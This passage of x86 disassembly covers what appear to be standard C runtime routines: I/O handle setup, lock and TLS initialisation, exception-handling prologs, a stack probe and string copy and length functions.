  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
